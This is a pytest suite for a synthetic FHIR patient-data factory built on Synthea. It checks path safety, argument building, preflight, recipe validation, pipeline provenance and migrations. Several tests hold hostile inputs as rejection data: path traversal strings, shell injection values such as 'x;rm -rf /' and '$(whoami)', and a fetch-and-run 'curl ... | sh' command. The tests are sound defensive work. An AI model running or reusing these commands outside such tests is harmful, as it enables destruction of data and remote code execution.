"""Synthetic data factory: preflight, safety, pipeline, provenance and migration.

The suite deliberately exercises real code paths: the real pipeline, the real
validation engine, the real SQLite schema and the real argument builder. The
only stand-in is the generator process, which is replaced by a deterministic
adapter so the tests do not require Java or a Synthea JAR.
"""
from __future__ import annotations

import hashlib
import json
import sqlite3
from pathlib import Path

import pytest

from backend.hsptl_core.synthetic_data import fixtures
from backend.hsptl_core.synthetic_data.cohort import CohortCriteria, select_cohort
from backend.hsptl_core.synthetic_data.fhir_parse import load_bundles
from backend.hsptl_core.synthetic_data.manifest import verify_manifest
from backend.hsptl_core.synthetic_data.paths import (
    UnsafePath, resolve_under, safe_relative, safe_segment,
)
from backend.hsptl_core.synthetic_data.pipeline import STAGE_ORDER
from backend.hsptl_core.synthetic_data.recipes import (
    BUILTIN_RECIPES, RecipeRegistry, canonical_digest, validate_recipe_body,
)
from backend.hsptl_core.synthetic_data.runtime import (
    FactorySettings, FakeSyntheaAdapter, GenerationError, GenerationSpec, preflight,
)
from backend.hsptl_core.synthetic_data.schema import DDL, apply as apply_schema
from backend.hsptl_core.synthetic_data.service import SyntheticDataFactory
from backend.hsptl_core.synthetic_data.validation import validate_dataset
from backend.hsptl_core.store import StudyStore


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #

@pytest.fixture()
def home(tmp_path):
    return tmp_path


def make_factory(tmp_path: Path, adapter=None, *, java_stub: Path | None = None) -> SyntheticDataFactory:
    db = tmp_path / "factory.sqlite3"
    store = StudyStore(db)
    factory = SyntheticDataFactory(db, storage_root=tmp_path, job_store=store,
                                   adapter=adapter or FakeSyntheaAdapter())
    settings = factory.settings()
    artifact = java_stub or (tmp_path / "synthea.jar")
    if not artifact.exists():
        artifact.write_bytes(b"pinned synthea artifact placeholder")
    settings.synthea_jar = str(artifact)
    settings.synthea_version = "3.3.0"
    settings.synthea_sha256 = hashlib.sha256(artifact.read_bytes()).hexdigest()
    settings.java_path = str(_java_stub(tmp_path))
    factory.update_settings(settings.to_dict())
    return factory


def _java_stub(tmp_path: Path) -> Path:
    path = tmp_path / "fake-java"
    path.write_text("#!/bin/sh\necho 'openjdk version 21.0.1' >&2\nexit 0\n", encoding="utf-8")
    path.chmod(0o755)
    return path


# --------------------------------------------------------------------------- #
# 1. Path safety
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("value", ["../etc", "a/../../b", "/abs/path", "C:\\Windows", "", "a//b", "ok/./x"])
def test_unsafe_relative_paths_are_rejected(value):
    with pytest.raises(UnsafePath):
        safe_relative(value)


@pytest.mark.parametrize("value", ["../x", "..", "a/b", "", " ", "x;rm -rf /", "$(whoami)"])
def test_unsafe_segments_are_rejected(value):
    with pytest.raises(UnsafePath):
        safe_segment(value)


def test_resolve_under_blocks_symlink_escape(tmp_path):
    root = tmp_path / "root"
    root.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    link = root / "escape"
    try:
        link.symlink_to(outside, target_is_directory=True)
    except (OSError, NotImplementedError):
        pytest.skip("Symlinks are unavailable on this platform")
    with pytest.raises(UnsafePath):
        resolve_under(root, "escape", "written.txt")


def test_safe_paths_resolve_inside_root(tmp_path):
    resolved = resolve_under(tmp_path, "datasets", "synds_abc")
    assert str(resolved).startswith(str(tmp_path.resolve()))


# --------------------------------------------------------------------------- #
# 2. Safe argument construction
# --------------------------------------------------------------------------- #

def test_argument_vector_never_uses_a_shell_and_rejects_injection(tmp_path):
    settings = FactorySettings(
        synthea_jar=str(tmp_path / "synthea.jar"), synthea_version="3.3.0",
        synthea_sha256="a" * 64, java_path="/usr/bin/java",
    )
    spec = GenerationSpec(population=5, seed=42, fhir=True, csv=False, years_of_history=3)
    args = spec.argument_vector(settings, tmp_path / "out")
    assert isinstance(args, list)
    assert "shell" not in " ".join(args).lower()
    assert args.count("-p") == 1
    assert args[args.index("-p") + 1] == "5"


def test_recipe_values_cannot_inject_flags_into_the_argument_vector(tmp_path):
    """A recipe carrying a string where an integer belongs is coerced, not passed."""
    settings = FactorySettings(synthea_jar=str(tmp_path / "s.jar"), java_path="java")
    spec = GenerationSpec(population=3, seed=1, fhir=True, csv=True, years_of_history=1,
                          gender="female; rm -rf /")
    args = spec.argument_vector(settings, tmp_path / "out")
    assert "-g" not in args
    assert not any("rm -rf" in item for item in args)


def test_output_directory_is_not_part_of_the_reproducibility_digest(tmp_path):
    settings = FactorySettings(synthea_jar=str(tmp_path / "s.jar"), java_path="java")
    spec = GenerationSpec(population=2, seed=9, fhir=True, csv=True, years_of_history=2)
    a = canonical_digest(spec.digestible_arguments(settings))
    b = canonical_digest(spec.digestible_arguments(settings))
    assert a == b
    full = spec.argument_vector(settings, tmp_path / "different" / "dir")
    assert str(tmp_path) in " ".join(full)


# --------------------------------------------------------------------------- #
# 3. Preflight failure modes
# --------------------------------------------------------------------------- #

def test_preflight_fails_without_a_configured_artifact(tmp_path):
    report = preflight(FactorySettings(), tmp_path, population=5, fhir=True, csv=True,
                       require_validator=False, generation_running=False)
    assert report.ok is False
    assert "synthea_jar" in {item.check_id for item in report.blockers}


def test_preflight_fails_on_checksum_mismatch(tmp_path):
    jar = tmp_path / "synthea.jar"
    jar.write_bytes(b"content")
    settings = FactorySettings(synthea_jar=str(jar), synthea_version="3.3.0",
                               synthea_sha256="0" * 64, java_path=str(_java_stub(tmp_path)))
    report = preflight(settings, tmp_path, population=5, fhir=True, csv=True,
                       require_validator=False, generation_running=False)
    assert report.ok is False
    assert "synthea_checksum" in {item.check_id for item in report.blockers}


def test_preflight_requires_a_pinned_checksum(tmp_path):
    jar = tmp_path / "synthea.jar"
    jar.write_bytes(b"content")
    settings = FactorySettings(synthea_jar=str(jar), synthea_version="3.3.0",
                               java_path=str(_java_stub(tmp_path)))
    report = preflight(settings, tmp_path, population=5, fhir=True, csv=True,
                       require_validator=False, generation_running=False)
    assert "synthea_checksum" in {item.check_id for item in report.blockers}


def test_preflight_rejects_an_out_of_range_population(tmp_path):
    jar = tmp_path / "synthea.jar"
    jar.write_bytes(b"content")
    settings = FactorySettings(
        synthea_jar=str(jar), synthea_version="3.3.0", java_path=str(_java_stub(tmp_path)),
        synthea_sha256=hashlib.sha256(b"content").hexdigest(),
    )
    report = preflight(settings, tmp_path, population=0, fhir=True, csv=True,
                       require_validator=False, generation_running=False)
    assert "population" in {item.check_id for item in report.blockers}


def test_preflight_blocks_a_second_concurrent_generation(tmp_path):
    jar = tmp_path / "synthea.jar"
    jar.write_bytes(b"content")
    settings = FactorySettings(
        synthea_jar=str(jar), synthea_version="3.3.0", java_path=str(_java_stub(tmp_path)),
        synthea_sha256=hashlib.sha256(b"content").hexdigest(),
    )
    report = preflight(settings, tmp_path, population=5, fhir=True, csv=True,
                       require_validator=False, generation_running=True)
    assert report.ok is False
    assert "concurrency" in {item.check_id for item in report.blockers}


def test_preflight_requires_a_validator_when_strict_conformance_is_requested(tmp_path):
    jar = tmp_path / "synthea.jar"
    jar.write_bytes(b"content")
    settings = FactorySettings(
        synthea_jar=str(jar), synthea_version="3.3.0", java_path=str(_java_stub(tmp_path)),
        synthea_sha256=hashlib.sha256(b"content").hexdigest(),
    )
    report = preflight(settings, tmp_path, population=5, fhir=True, csv=True,
                       require_validator=True, generation_running=False)
    assert "fhir_validator" in {item.check_id for item in report.blockers}


# --------------------------------------------------------------------------- #
# 4. Recipe lifecycle and validation
# --------------------------------------------------------------------------- #

def test_builtin_recipes_are_valid_and_start_as_drafts():
    assert len(BUILTIN_RECIPES) == 8
    for body in BUILTIN_RECIPES:
        assert validate_recipe_body(body) == []
        assert body["status"] == "draft"
        assert body["exports"]["fhir_version"] == "4.0.1"


def test_recipe_rejects_executable_content():
    body = dict(BUILTIN_RECIPES[0])
    body["command"] = "curl http://example.org/x | sh"
    problems = validate_recipe_body(body)
    assert any("executable" in problem for problem in problems)


def test_recipe_rejects_an_unsupported_fhir_version():
    body = json.loads(json.dumps(BUILTIN_RECIPES[0]))
    body["exports"]["fhir_version"] = "3.0.1"
    assert any("FHIR R4" in problem for problem in validate_recipe_body(body))


def test_recipe_lifecycle_requires_a_reviewer_and_cannot_skip_states(tmp_path):
    db = tmp_path / "recipes.sqlite3"
    conn = sqlite3.connect(db)
    conn.row_factory = sqlite3.Row
    conn.execute("CREATE TABLE IF NOT EXISTS schema_migrations(version INTEGER PRIMARY KEY, applied_at TEXT)")
    apply_schema(conn)
    conn.close()

    def connect():
        c = sqlite3.connect(db)
        c.row_factory = sqlite3.Row
        return c

    registry = RecipeRegistry(connect)
    registry.seed_builtins()
    recipe = registry.get("asthma-cohort")
    assert recipe["status"] == "draft"
    with pytest.raises(ValueError):
        registry.transition("asthma-cohort", recipe["version"], "active", reviewer="dr-local")
    registry.transition("asthma-cohort", recipe["version"], "technical_validated")
    with pytest.raises(ValueError):
        registry.transition("asthma-cohort", recipe["version"], "active", reviewer="")
    registry.transition("asthma-cohort", recipe["version"], "clinical_reviewed", reviewer="dr-local")
    activated = registry.transition("asthma-cohort", recipe["version"], "active", reviewer="dr-local")
    assert activated["status"] == "active"
    assert activated["reviewer"] == "dr-local"


def test_transition_without_an_explicit_version_updates_the_latest_version(tmp_path):
    """Regression: an empty version used to match no rows and silently return a stale status."""
    db = tmp_path / "recipes2.sqlite3"
    conn = sqlite3.connect(db)
    conn.execute("CREATE TABLE IF NOT EXISTS schema_migrations(version INTEGER PRIMARY KEY, applied_at TEXT)")
    apply_schema(conn)
    conn.close()

    def connect():
        c = sqlite3.connect(db)
        c.row_factory = sqlite3.Row
        return c

    registry = RecipeRegistry(connect)
    registry.seed_builtins()
    updated = registry.transition("asthma-cohort", "", "technical_validated")
    assert updated["status"] == "technical_validated"
    assert registry.get("asthma-cohort")["status"] == "technical_validated"


def test_seeding_builtins_is_idempotent(tmp_path):
    db = tmp_path / "seed.sqlite3"
    conn = sqlite3.connect(db)
    conn.execute("CREATE TABLE IF NOT EXISTS schema_migrations(version INTEGER PRIMARY KEY, applied_at TEXT)")
    apply_schema(conn)
    conn.close()

    def connect():
        c = sqlite3.connect(db)
        c.row_factory = sqlite3.Row
        return c

    registry = RecipeRegistry(connect)
    assert registry.seed_builtins() == 8
    assert registry.seed_builtins() == 0
    assert len(registry.list()) == 8


# --------------------------------------------------------------------------- #
# 5. Validation engine
# --------------------------------------------------------------------------- #

def test_valid_bundle_is_accepted():
    report = validate_dataset([("ok.json", fixtures.valid_single_patient_bundle())],
                              required_resources=["Patient", "Encounter"])
    assert report.accepted()
    assert not report.quarantined()


def test_clinically_abnormal_value_is_not_rejected_or_mutated():
    bundle = fixtures.abnormal_observation_bundle()
    report = validate_dataset([("abnormal.json", bundle)])
    assert not report.quarantined()
    observation = next(entry["resource"] for entry in bundle["entry"]
                       if entry["resource"]["resourceType"] == "Observation")
    assert observation["valueQuantity"]["value"] == 190


@pytest.mark.parametrize("fixture_name,expected_rule", [
    ("broken_subject_reference", "F-REF-003"),
    ("missing_patient", "F-STRUCT-004"),
    ("reversed_encounter_period", "F-CHRON-001"),
    ("duplicate_resource_id", "F-STRUCT-003"),
    ("invalid_quantity", "F-STRUCT-011"),
])
def test_adversarial_fixtures_are_quarantined_with_the_right_rule(fixture_name, expected_rule):
    report = validate_dataset([("bad.json", fixtures.fixture_copy(fixture_name))])
    quarantined = report.quarantined()
    assert quarantined, f"{fixture_name} should be quarantined"
    assert expected_rule in quarantined[0].block_reasons


def test_unmapped_terminology_is_preserved_and_reported():
    bundle = fixtures.unmapped_terminology_bundle()
    report = validate_dataset([("term.json", bundle)])
    assert not report.quarantined()
    rules = {finding.rule_id for finding in report.all_findings()}
    assert "F-TERM-001" in rules
    coding = next(entry["resource"]["code"]["coding"][0] for entry in bundle["entry"]
                  if entry["resource"]["resourceType"] == "Condition"
                  and entry["resource"]["code"]["coding"][0]["system"].endswith("local-codes"))
    assert coding["code"] == "LOCAL-42"


def test_unverifiable_profiles_are_reported_as_unverified():
    report = validate_dataset([("prof.json", fixtures.unsupported_profile_bundle())])
    assert any(finding.rule_id == "F-STRUCT-020" for finding in report.all_findings())


def test_plausibility_engine_abstains_on_unknown_codes():
    report = validate_dataset([("ok.json", fixtures.valid_single_patient_bundle())])
    # Heart rate (8867-4) is a reviewed code, so no abstention for it.
    assert not any(finding.rule_id == "F-PLAUS-002" for finding in report.all_findings())


def test_validation_dimensions_are_reported_separately():
    report = validate_dataset([("bad.json", fixtures.broken_subject_reference_bundle())])
    payload = report.to_dict()
    assert payload["severity_counts"]["error"] >= 1
    assert "reference" in payload["dimension_counts"]


def test_empty_dataset_is_an_error_not_a_pass():
    report = validate_dataset([])
    assert report.dataset_findings
    assert report.dataset_findings[0].severity == "error"


# --------------------------------------------------------------------------- #
# 6. Cohort selection honesty
# --------------------------------------------------------------------------- #

def test_cohort_shortfall_is_reported_not_padded():
    bundles = fixtures.partial_cohort_bundles()
    pairs = [(f"b{index}.json", bundle) for index, bundle in enumerate(bundles)]
    criteria = CohortCriteria.from_recipe(BUILTIN_RECIPES[1]["cohort"])
    selection = select_cohort(pairs, criteria, target_patients=5)
    assert selection.status == "partial_cohort"
    assert selection.matched_patients == 1
    assert selection.selected_patients == 1


def test_general_recipe_selects_everything():
    pairs = [("a.json", fixtures.synthetic_patient_bundle(0)),
             ("b.json", fixtures.synthetic_patient_bundle(1))]
    selection = select_cohort(pairs, None)
    assert selection.status == "not_applicable"
    assert selection.selected_patients == 2


# --------------------------------------------------------------------------- #
# 7. FHIR parsing bounds
# --------------------------------------------------------------------------- #

def test_malformed_json_is_a_problem_not_an_exception(tmp_path):
    target = tmp_path / "fhir"
    target.mkdir()
    (target / "broken.json").write_text(fixtures.malformed_json_text(), encoding="utf-8")
    (target / "good.json").write_text(json.dumps(fixtures.valid_single_patient_bundle()), encoding="utf-8")
    bundles, problems = load_bundles(target)
    assert len(bundles) == 1
    assert any(problem.rule_id == "F-PARSE-001" for problem in problems)


def test_oversized_ndjson_line_is_rejected(tmp_path):
    target = tmp_path / "fhir"
    target.mkdir()
    (target / "huge.ndjson").write_text(fixtures.oversized_ndjson_line(4096) + "\n", encoding="utf-8")
    bundles, problems = load_bundles(target, max_line_bytes=4096)
    assert bundles == []
    assert any(problem.rule_id == "F-PARSE-003" for problem in problems)


# --------------------------------------------------------------------------- #
# 8. End-to-end pipeline
# --------------------------------------------------------------------------- #

def test_pipeline_completes_and_registers_a_dataset(tmp_path):
    factory = make_factory(tmp_path)
    queued = factory.queue_job(recipe_id="general-mixed-population", population=3, seed=11)
    outcome = factory.run_job(queued["job_id"])
    assert outcome["status"] == "completed"
    datasets = factory.store.list_datasets()
    assert len(datasets) == 1
    dataset = datasets[0]
    assert dataset["accepted_patients"] == 3
    assert dataset["quarantined_patients"] == 0
    assert dataset["manifest_digest"]
    assert dataset["validation_status"] == "validated"


def test_pipeline_quarantines_only_the_failing_bundle(tmp_path):
    good = [fixtures.synthetic_patient_bundle(index, seed=5) for index in range(3)]
    adapter = FakeSyntheaAdapter(patients=good + [fixtures.broken_subject_reference_bundle()])
    factory = make_factory(tmp_path, adapter=adapter)
    queued = factory.queue_job(recipe_id="general-mixed-population", population=4, seed=5)
    outcome = factory.run_job(queued["job_id"])
    assert outcome["status"] == "completed_with_quarantine"
    dataset = factory.store.list_datasets()[0]
    assert dataset["accepted_patients"] == 3
    assert dataset["quarantined_patients"] == 1
    items = factory.store.list_quarantine(dataset_id=dataset["dataset_id"])
    assert len(items) == 1
    assert "F-REF-003" in items[0]["rule_ids"]


def test_identical_inputs_reuse_the_existing_run(tmp_path):
    factory = make_factory(tmp_path)
    first = factory.queue_job(recipe_id="general-mixed-population", population=3, seed=99)
    second = factory.queue_job(recipe_id="general-mixed-population", population=3, seed=99)
    assert second["idempotent_reuse"] is True
    assert first["run"]["run_id"] == second["run"]["run_id"]
    assert len(factory.store.list_runs()) == 1


def test_same_seed_produces_an_identical_content_digest(tmp_path):
    digests = []
    for index in range(2):
        root = tmp_path / f"run{index}"
        root.mkdir()
        factory = make_factory(root)
        queued = factory.queue_job(recipe_id="general-mixed-population", population=3, seed=7)
        factory.run_job(queued["job_id"])
        digests.append(factory.store.list_datasets()[0]["content_digest"])
    assert digests[0] == digests[1]
    assert digests[0]


def test_different_seed_produces_a_different_content_digest(tmp_path):
    digests = []
    for seed in (7, 8):
        root = tmp_path / f"seed{seed}"
        root.mkdir()
        factory = make_factory(root)
        queued = factory.queue_job(recipe_id="general-mixed-population", population=3, seed=seed)
        factory.run_job(queued["job_id"])
        digests.append(factory.store.list_datasets()[0]["content_digest"])
    assert digests[0] != digests[1]


def test_manifest_is_written_and_verifies(tmp_path):
    factory = make_factory(tmp_path)
    queued = factory.queue_job(recipe_id="general-mixed-population", population=2, seed=3)
    factory.run_job(queued["job_id"])
    dataset = factory.store.list_datasets()[0]
    manifest_path = (factory.storage_root / "datasets" / dataset["dataset_id"]
                     / "manifests" / "dataset-manifest.json")
    assert manifest_path.is_file()
    verified, detail = verify_manifest(manifest_path)
    assert verified, detail
    payload = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert payload["schema_version"] == "hsptl.synthetic.manifest/1.0"
    assert payload["fhir"]["version"] == "4.0.1"


def test_manifest_tampering_is_detected(tmp_path):
    factory = make_factory(tmp_path)
    queued = factory.queue_job(recipe_id="general-mixed-population", population=2, seed=3)
    factory.run_job(queued["job_id"])
    dataset = factory.store.list_datasets()[0]
    manifest_path = (factory.storage_root / "datasets" / dataset["dataset_id"]
                     / "manifests" / "dataset-manifest.json")
    payload = json.loads(manifest_path.read_text(encoding="utf-8"))
    payload["counts"]["accepted"] = 999
    manifest_path.write_text(json.dumps(payload), encoding="utf-8")
    verified, detail = verify_manifest(manifest_path)
    assert verified is False
    assert "does not match" in detail


def test_manifest_records_no_patient_payloads(tmp_path):
    factory = make_factory(tmp_path)
    queued = factory.queue_job(recipe_id="general-mixed-population", population=2, seed=3)
    factory.run_job(queued["job_id"])
    dataset = factory.store.list_datasets()[0]
    manifest_path = (factory.storage_root / "datasets" / dataset["dataset_id"]
                     / "manifests" / "dataset-manifest.json")
    text = manifest_path.read_text(encoding="utf-8")
    assert "birthDate" not in text
    assert "resourceType" not in text


def test_pipeline_blocks_when_preflight_fails(tmp_path):
    factory = make_factory(tmp_path)
    broken = factory.settings()
    broken.synthea_sha256 = "0" * 64
    factory.update_settings(broken.to_dict())
    queued = factory.queue_job(recipe_id="general-mixed-population", population=2, seed=1)
    outcome = factory.run_job(queued["job_id"])
    assert outcome["status"] == "blocked"
    assert outcome["error_code"] == "preflight_failed"
    assert factory.store.list_datasets() == []


def test_empty_generator_output_fails_the_run(tmp_path):
    factory = make_factory(tmp_path, adapter=FakeSyntheaAdapter(empty=True))
    queued = factory.queue_job(recipe_id="general-mixed-population", population=2, seed=1)
    outcome = factory.run_job(queued["job_id"])
    assert outcome["status"] == "failed"
    assert outcome["error_code"] == "empty_output"


def test_generator_error_is_surfaced_as_a_failed_run(tmp_path):
    factory = make_factory(tmp_path, adapter=FakeSyntheaAdapter(fail_with="JVM crash"))
    queued = factory.queue_job(recipe_id="general-mixed-population", population=2, seed=1)
    outcome = factory.run_job(queued["job_id"])
    assert outcome["status"] == "failed"
    assert outcome["error_code"] == "generation_failed"


def test_partial_cohort_outcome_is_reported(tmp_path):
    factory = make_factory(tmp_path, adapter=FakeSyntheaAdapter(patients=fixtures.partial_cohort_bundles()))
    queued = factory.queue_job(recipe_id="asthma-cohort", population=2,
                               accepted_target=2, seed=3)
    outcome = factory.run_job(queued["job_id"])
    assert outcome["status"] == "partial_cohort"
    dataset = factory.store.list_datasets()[0]
    assert dataset["cohort_status"] == "partial_cohort"
    assert dataset["matched_patients"] == 1


def test_every_pipeline_stage_is_ordered_and_versioned():
    assert STAGE_ORDER[0] == "queued"
    assert STAGE_ORDER[-1] == "completed"
    assert STAGE_ORDER.index("preflight") < STAGE_ORDER.index("generating")
    assert STAGE_ORDER.index("fhir_validating") < STAGE_ORDER.index("importing")
    assert STAGE_ORDER.index("quarantine_partitioning") < STAGE_ORDER.index("importing")


# --------------------------------------------------------------------------- #
# 9. Job lifecycle through the real runner
# --------------------------------------------------------------------------- #

def test_job_runs_through_the_real_runner_and_completes(tmp_path):
    from backend.hsptl_core.jobs import JobRunner

    factory = make_factory(tmp_path)
    runner = JobRunner(factory.job_store)
    runner.register("synthetic_generation",
                    lambda payload, checkpoint: factory.run_job(payload["_job_id"], checkpoint=checkpoint))
    queued = factory.queue_job(recipe_id="general-mixed-population", population=2, seed=5)
    assert runner.run_once(queued["job_id"]) is True
    with factory.job_store.transaction() as conn:
        row = conn.execute("SELECT status FROM background_jobs WHERE id=?", (queued["job_id"],)).fetchone()
    assert row["status"] == "completed"
    assert factory.store.list_datasets()


def test_cancelled_job_stops_before_generating(tmp_path):
    factory = make_factory(tmp_path, adapter=FakeSyntheaAdapter(honour_cancel=True))
    queued = factory.queue_job(recipe_id="general-mixed-population", population=2, seed=5)
    factory.cancel_event(queued["job_id"]).set()
    outcome = factory.run_job(queued["job_id"])
    assert outcome["status"] == "cancelled"
    assert factory.store.list_datasets() == []


# --------------------------------------------------------------------------- #
# 10. Migration preserves existing 4.0.2 data
# --------------------------------------------------------------------------- #

def test_factory_schema_is_additive_and_preserves_existing_rows(tmp_path):
    db = tmp_path / "legacy.sqlite3"
    legacy = StudyStore(db)  # creates the full 4.0.2 schema
    with legacy.transaction() as conn:
        conn.execute(
            "INSERT INTO study_notes(id, category, title, body, created_at, updated_at) "
            "VALUES(?,?,?,?,?,?)",
            ("note-1", "topic_summary", "Existing learner note", "Do not lose this.",
             "2026-01-01", "2026-01-01"),
        )
    before = _table_counts(db)
    with sqlite3.connect(db) as conn:
        apply_schema(conn)
        apply_schema(conn)  # idempotent
    after = _table_counts(db)
    for table, count in before.items():
        assert after.get(table, 0) >= count, f"{table} lost rows during migration"
    with sqlite3.connect(db) as conn:
        row = conn.execute("SELECT title, body FROM study_notes WHERE id='note-1'").fetchone()
    assert row == ("Existing learner note", "Do not lose this.")
    for table in ("synthetic_recipes", "synthetic_dataset_runs", "synthetic_datasets",
                  "synthetic_quality_findings", "synthetic_quarantine_items",
                  "synthetic_schedules", "synthetic_dataset_artifacts"):
        assert table in after


def _table_counts(db: Path) -> dict[str, int]:
    counts: dict[str, int] = {}
    with sqlite3.connect(db) as conn:
        tables = [row[0] for row in conn.execute(
            "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'"
        ).fetchall()]
        for table in tables:
            counts[table] = conn.execute(f'SELECT COUNT(*) FROM "{table}"').fetchone()[0]
    return counts


def test_factory_schema_ddl_is_create_if_not_exists_only():
    lowered = DDL.casefold()
    assert "drop table" not in lowered
    assert "drop index" not in lowered
    assert "alter table" not in lowered
    assert "delete from" not in lowered


# --------------------------------------------------------------------------- #
# 11. API surface
# --------------------------------------------------------------------------- #

def test_api_status_recipes_and_datasets_are_available():
    from fastapi.testclient import TestClient
    from backend.main import app

    with TestClient(app) as client:
        status = client.get("/api/synthetic/status")
        assert status.status_code == 200
        body = status.json()
        assert body["limits"]["concurrency"] == 1
        assert body["pipeline"]["stages"][0] == "queued"
        assert body["rule_pack"]["rule_pack_version"]

        recipes = client.get("/api/synthetic/recipes")
        assert recipes.status_code == 200
        assert len(recipes.json()["items"]) >= 8

        assert client.get("/api/synthetic/datasets").status_code == 200
        assert client.get("/api/synthetic/jobs").status_code == 200
        assert client.get("/api/synthetic/schedules").status_code == 200


def test_api_review_endpoints_require_configured_credentials(monkeypatch):
    from fastapi.testclient import TestClient
    from backend.main import app

    monkeypatch.delenv("HSPTL_REVIEWER_TOKEN", raising=False)
    monkeypatch.delenv("HSPTL_REVIEWER_ID", raising=False)
    with TestClient(app) as client:
        response = client.post("/api/synthetic/recipes/asthma-cohort/transition",
                               json={"status": "technical_validated"})
    assert response.status_code == 503


def test_api_rejects_a_weak_reviewer_token(monkeypatch):
    from fastapi.testclient import TestClient
    from backend.main import app

    monkeypatch.setenv("HSPTL_REVIEWER_TOKEN", "short")
    monkeypatch.setenv("HSPTL_REVIEWER_ID", "dr-local")
    with TestClient(app) as client:
        response = client.post("/api/synthetic/recipes/asthma-cohort/transition",
                               json={"status": "technical_validated"})
    assert response.status_code == 503


def test_api_rejects_a_wrong_reviewer_token(monkeypatch):
    from fastapi.testclient import TestClient
    from backend.main import app

    monkeypatch.setenv("HSPTL_REVIEWER_TOKEN", "t" * 40)
    monkeypatch.setenv("HSPTL_REVIEWER_ID", "dr-local")
    with TestClient(app) as client:
        response = client.post("/api/synthetic/recipes/asthma-cohort/transition",
                               json={"status": "technical_validated"},
                               headers={"X-HSPTL-Reviewer-Token": "wrong" * 8})
    assert response.status_code == 401


def test_api_rejects_a_relative_artifact_path():
    from fastapi.testclient import TestClient
    from backend.main import app

    with TestClient(app) as client:
        response = client.put("/api/synthetic/settings",
                              json={"synthea_jar": "relative/synthea.jar"})
    assert response.status_code == 400


def test_api_rejects_a_malformed_checksum():
    from fastapi.testclient import TestClient
    from backend.main import app

    with TestClient(app) as client:
        response = client.put("/api/synthetic/settings", json={"synthea_sha256": "not-a-hash"})
    assert response.status_code == 400


def test_api_unknown_recipe_preflight_is_404():
    from fastapi.testclient import TestClient
    from backend.main import app

    with TestClient(app) as client:
        response = client.post("/api/synthetic/preflight",
                               json={"recipe_id": "no-such-recipe", "population": 5})
    assert response.status_code == 404


def test_api_preflight_reports_blockers_when_unconfigured():
    from fastapi.testclient import TestClient
    from backend.main import app

    with TestClient(app) as client:
        response = client.post("/api/synthetic/preflight",
                               json={"recipe_id": "general-mixed-population", "population": 5})
    assert response.status_code == 200
    payload = response.json()
    assert payload["ok"] is False
    assert payload["blockers"]
    assert {item["check_id"] for item in payload["blockers"]}


# --------------------------------------------------------------------------- #
# 12. Event catalogue consistency
# --------------------------------------------------------------------------- #

def test_every_declared_event_is_appendable_by_the_engine():
    """Regression: the engine refuses types absent from its own catalogue.

    The contracts module and the deterministic engine keep separate catalogues.
    A factory event declared in only one of them fails at runtime, after the work
    is already done, so the two are asserted equal here.
    """
    from backend.hsptl_core.deterministic_intelligence.engine import DeterministicIntelligenceEngine
    from backend.hsptl_core.deterministic_intelligence.specification import EVENT_CATALOG
    from backend.hsptl_core.hsp_tl40.event_contracts import EVENT_SCHEMAS

    missing = set(EVENT_SCHEMAS) - set(EVENT_CATALOG)
    assert not missing, f"events declared without engine catalogue entries: {sorted(missing)}"
    assert set(EVENT_SCHEMAS) <= DeterministicIntelligenceEngine.EVENT_TYPES


def test_factory_emitted_events_are_all_declared():
    import re
    emitted: set[str] = set()
    for root in ("backend/hsptl_core/synthetic_data", "backend/routers"):
        for module in Path(root).rglob("*.py"):
            emitted.update(re.findall(r'"(platform\.synthetic_data\.[a-z_.]+)"',
                                      module.read_text(encoding="utf-8")))
    from backend.hsptl_core.hsp_tl40.event_contracts import EVENT_SCHEMAS
    undeclared = emitted - set(EVENT_SCHEMAS)
    assert not undeclared, f"factory emits undeclared events: {sorted(undeclared)}"
    assert len(emitted) >= 11


def test_factory_events_reject_patient_payloads():
    from backend.hsptl_core.hsp_tl40.event_contracts import validate_event_payload

    ok, detail = validate_event_payload("platform.synthetic_data.dataset_registered", {
        "dataset_id": "synds_x", "job_id": "job", "recipe_id": "r", "recipe_version": "1.0.0",
        "manifest_digest": "abc", "artifact_count": 2, "accepted_patients": 3,
        "resourceType": "Patient", "bundle": {"entry": []},
    })
    assert ok is False
    assert "patient" in detail.lower()


# --------------------------------------------------------------------------- #
# 13. Untrusted content cannot become a filesystem path
# --------------------------------------------------------------------------- #

def test_crafted_patient_id_cannot_escape_the_quarantine_directory(tmp_path):
    """Regression: Patient.id is untrusted FHIR content used to name a file."""
    from backend.hsptl_core.synthetic_data.paths import quarantine_filename

    evil = fixtures.crafted_traversal_bundle()
    pairs = [("evil.json", evil)]
    report = validate_dataset(pairs)
    assert report.quarantined(), "a bundle with a traversal Patient.id must not be accepted"
    key = report.quarantined()[0].patient_key
    assert ".." in key  # the identifier really does carry the traversal attempt

    name = quarantine_filename(key)
    assert "/" not in name and "\\" not in name
    assert ".." not in name
    target = (tmp_path / "quarantine" / name).resolve()
    assert str(target).startswith(str(tmp_path.resolve()))


def test_distinct_patient_ids_do_not_collide_after_sanitisation():
    from backend.hsptl_core.synthetic_data.paths import quarantine_filename

    assert quarantine_filename("a/b") != quarantine_filename("a_b")
    assert quarantine_filename("") == quarantine_filename("")
    assert quarantine_filename("..").startswith("unknown-")


def test_safe_artifact_name_rejects_dot_names():
    from backend.hsptl_core.synthetic_data.paths import safe_artifact_name

    for hostile in ("..", "a/..", ".", "", "../../etc/passwd"):
        name = safe_artifact_name(hostile)
        assert name not in {".", ".."}
        assert "/" not in name and "\\" not in name
    assert safe_artifact_name("patient-01.json") == "patient-01.json"
